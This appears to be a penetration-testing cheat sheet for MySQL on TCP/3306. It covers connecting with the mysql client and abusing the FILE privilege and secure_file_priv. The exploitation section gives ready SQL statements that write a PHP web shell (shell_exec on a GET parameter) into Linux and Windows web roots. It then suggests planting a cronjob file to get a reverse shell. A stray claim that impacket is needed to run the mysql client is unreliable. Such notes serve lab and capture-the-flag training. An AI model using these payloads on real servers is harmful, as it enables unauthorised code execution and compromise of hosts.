Mysql (TCP/3306)

MySQL is an open source relational database management system (RDBMS) that's used to store and manage data

Usage

Connect to DB

    You must have impacket suit installed (/examples directory)

    mysql -u root -h 10.129.14.132 -p

    In case you see an error like "ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain" just use --skip-ssl

Exploitation

    Command execution

      We can achieve command execution if we write to a location in the file system that can execute our commands

      These operations are permitted only to users who have the FILE privilege. secure_file_priv may be set as follows:

      • If empty, the variable has no effect, which is not a secure setting.
      • If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
      • If set to NULL, the server disables import and export operations.

      Use the following command to check how the variable is set

      show variables like "secure_file_priv";

      In case it's empty or it is located only in a specific folder we can try to perform

      Linux 
      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
      Windows

      Rmember that there is no \ in case you would like to use them you could do \\

      SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/mytest.php';

      From here you should try to locate some cronjob and attempt to write a simple file in order to get executed by a user inside a machine. Then you'll get a reverse shell
